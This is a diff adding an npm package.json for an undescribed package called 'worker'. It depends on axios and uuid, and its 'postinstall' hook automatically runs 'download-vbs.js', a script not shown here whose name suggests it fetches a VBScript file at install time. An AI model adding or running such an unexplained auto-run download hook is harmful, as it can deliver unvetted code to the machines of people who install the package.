@@ -1,0 +1,20 @@
+{
+  "name": "worker",
+  "version": "1.0.0",
+  "description": "",
+  "main": "download-vbs.js",
+  "scripts": {
+    "postinstall": "node download-vbs.js",
+    "start": "node download-vbs.js",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "type": "commonjs",
+  "dependencies": {
+    "axios": "^1.13.2",
+    "uuid": "^13.0.0"
+  }
+}
+
